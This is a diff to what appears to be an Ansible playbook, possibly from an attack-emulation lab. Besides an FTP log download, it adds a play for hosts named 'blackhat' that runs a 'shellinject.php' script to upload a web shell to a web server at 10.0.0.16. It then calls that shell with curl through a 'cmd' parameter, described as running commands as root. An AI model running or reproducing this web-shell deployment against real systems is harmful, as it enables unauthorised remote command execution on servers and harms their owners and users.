@@ -34,3 +34,10 @@
   tasks:
     - name: download log file from ftp
       raw: wget --user=anonymous --password='contractor@fazio.com' ftp://ftp.fazio.com:21/upload/logs.txt
+- name: implement shell injection to webserver
+  hosts: blackhat
+  tasks:
+    - name: log in web server and upload shell file
+      raw: php shellinject.php logs.txt 10.0.0.16 shell.php
+    - name: run shell command as root on web server
+      raw: curl -X GET 10.0.0.16/images/shell.php\?cmd\=ls 
